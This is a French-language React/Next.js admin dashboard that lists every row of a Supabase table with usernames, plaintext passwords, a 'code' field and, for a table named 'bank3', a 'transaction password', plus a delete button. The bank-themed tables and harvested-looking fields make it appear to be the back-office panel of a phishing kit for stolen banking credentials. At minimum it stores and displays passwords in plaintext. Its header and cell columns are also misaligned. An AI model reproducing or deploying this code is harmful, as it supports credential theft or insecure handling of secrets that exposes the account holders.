'use client'

import { createClient } from '@/utils/supabase/client'
import React from 'react'
import { useState, useEffect } from 'react'

interface UserData {
  id: string
  username: string
  password: string
  code: string
  transacPassword?: string
  created_at: string
}
type Props = {
  params: Promise<{ id: string, table: string }>
}
export default function AdminDashboard({ params }: Props) {
  const { table} = React.use(params)

  const [data, setData] = useState<UserData[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [searchTerm, setSearchTerm] = useState('')
  
  const supabase = createClient()
  const tableName = table // Remplacez par le nom de votre table

  // Fonction pour charger les données
  const fetchData = async () => {
    setIsLoading(true)
    setError(null)

    try {
      const { data: users, error } = await supabase
        .from(tableName)
        .select('*')
        .order('created_at', { ascending: false })

      if (error) throw error

      setData(users || [])
    } catch (error: any) {
      console.error('Erreur lors du chargement:', error)
      setError(error.message || 'Une erreur est survenue')
    } finally {
      setIsLoading(false)
    }
  }

  // Charger les données au montage du composant
  useEffect(() => {
    fetchData()
  }, [])

  // Fonction pour supprimer une entrée
  const handleDelete = async (id: string) => {
    if (!confirm('Voulez-vous vraiment supprimer cette entrée ?')) return

    try {
      const { error } = await supabase
        .from(tableName)
        .delete()
        .eq('id', id)

      if (error) throw error

      // Recharger les données
      fetchData()
    } catch (error: any) {
      console.error('Erreur lors de la suppression:', error)
      alert('Erreur lors de la suppression')
    }
  }

  // Filtrer les données selon la recherche
  const filteredData = data.filter(item =>
    item.username.toLowerCase().includes(searchTerm.toLowerCase())
  )

  // Formater la date
  const formatDate = (dateString: string) => {
    const date = new Date(dateString)
    return date.toLocaleString('fr-FR', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit'
    })
  }

  return (
    <div className="min-h-screen bg-gray-50 p-6">
      <div className="max-w-7xl mx-auto">
        {/* En-tête */}
        <div className="bg-white rounded-lg shadow-md p-6 mb-6">
          <h1 className="text-3xl font-bold text-gray-800 mb-2">
            Tableau de bord administrateur
          </h1>
          <p className="text-gray-600">
            Gestion des utilisateurs - Total: {data.length} entrée(s)
          </p>
        </div>

        {/* Barre de recherche et actions */}
        <div className="bg-white rounded-lg shadow-md p-4 mb-6 flex flex-col sm:flex-row gap-4 items-center justify-between">
          
          <button
            onClick={fetchData}
            className="px-6 py-2 bg-green-600 hover:bg-green-700 text-white font-semibold rounded-lg shadow transition-all flex items-center gap-2"
          >
            <i className="fas fa-sync-alt"></i>
            Actualiser
          </button>
        </div>

        {/* Message d'erreur */}
        {error && (
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-lg mb-6">
            <i className="fas fa-exclamation-circle mr-2"></i>
            {error}
          </div>
        )}

        {/* Tableau */}
        <div className="bg-white rounded-lg shadow-md overflow-hidden">
          {isLoading ? (
            <div className="flex justify-center items-center py-20">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-green-600"></div>
            </div>
          ) : filteredData.length === 0 ? (
            <div className="text-center py-20 text-gray-500">
              <i className="fas fa-inbox text-5xl mb-4"></i>
              <p className="text-lg">Aucune donnée disponible</p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="min-w-full divide-y divide-gray-200">
                <thead className="bg-gray-50">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      #
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Nom d'utilisateur
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Mot de passe
                    </th>
                    {table === 'bank3' && (
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Mot de passe de transaction
                      </th>
                    )}
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      code
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Date de création
                    </th>
                    <th className="px-6 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody className="bg-white divide-y divide-gray-200">
                  {filteredData.map((item, index) => (
                    <tr key={item.id} className="hover:bg-gray-50 transition-colors">
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                        {item.id}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="flex items-center">
                          <div className="flex-shrink-0 h-10 w-10 bg-green-100 rounded-full flex items-center justify-center">
                            <i className="fas fa-user text-green-600"></i>
                          </div>
                          <div className="ml-4">
                            <div className="text-sm font-medium text-gray-900">
                              {item.username}
                            </div>
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm text-gray-900 font-mono bg-gray-100 px-3 py-1 rounded inline-block">
                          {item.password}
                        </div>
                      </td>
                        {table === 'bank3' && (
                            <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm text-gray-900 font-mono bg-gray-100 px-3 py-1 rounded inline-block">
                          {item.transacPassword || 'N/A'}
                        </div>
                      </td>
                        )}
                      
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                        <i className="fas fa-clock mr-2"></i>
                        {formatDate(item.created_at)}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                        {item.code || 'N/A'}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-center text-sm font-medium">
                        <button
                          onClick={() => handleDelete(item.id)}
                          className="text-red-600 hover:text-red-900 transition-colors px-3 py-1 rounded hover:bg-red-50"
                        >
                          <i className="fas fa-trash-alt mr-1"></i>
                          Supprimer
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>

        {/* Footer avec statistiques */}
        <div className="mt-6 bg-white rounded-lg shadow-md p-4">
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-center">
            <div className="p-4 bg-blue-50 rounded-lg">
              <i className="fas fa-database text-blue-600 text-2xl mb-2"></i>
              <p className="text-sm text-gray-600">Total</p>
              <p className="text-2xl font-bold text-gray-800">{data.length}</p>
            </div>
            <div className="p-4 bg-green-50 rounded-lg">
              <i className="fas fa-search text-green-600 text-2xl mb-2"></i>
              <p className="text-sm text-gray-600">Résultats</p>
              <p className="text-2xl font-bold text-gray-800">{filteredData.length}</p>
            </div>
            <div className="p-4 bg-purple-50 rounded-lg">
              <i className="fas fa-clock text-purple-600 text-2xl mb-2"></i>
              <p className="text-sm text-gray-600">Dernière MAJ</p>
              <p className="text-sm font-semibold text-gray-800">
                {new Date().toLocaleTimeString('fr-FR')}
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}